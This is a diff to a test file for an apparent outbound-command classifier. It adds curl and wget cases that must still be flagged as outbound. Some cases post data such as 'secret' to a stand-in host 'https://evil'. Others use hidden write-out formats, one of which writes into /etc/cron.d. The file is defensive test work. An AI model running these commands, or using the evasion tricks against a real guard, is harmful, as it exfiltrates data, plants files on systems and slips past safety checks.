@@ -397,6 +397,17 @@ describe("validated write-out format strings clear as reads on any host", () => 
 		"curl -w '%output{/tmp/ptr}' -o /dev/null https://x",
 		"curl --write-out=%output{/tmp/x} -o /dev/null https://x",
 		"curl -w '%output{/tmp/ptr}' https://x",
+		// Indeterminate -w values (codex round 6): a format file, a shell
+		// variable, and ANSI-C quoting can all carry %output at runtime.
+		"curl -o /dev/null -w @/tmp/format https://evil",
+		'curl -o /dev/null -w "$FORMAT" https://evil',
+		"curl -o /dev/null -w $'\\x25output{/etc/cron.d/omp}' https://evil",
+		// Discarding the response does not make a sending request a read
+		// (codex round 6): the body still hits the wire.
+		"wget --method=POST --body-data=x -O /dev/null https://evil",
+		"wget --body-data=x --output-document=/dev/null https://evil",
+		"curl -d secret -o /dev/null https://x",
+		"curl -X POST -o /dev/null https://x",
 	]) {
 		test(`still outbound: ${command}`, () => {
 			expect(outbound(command)).toBe(true);
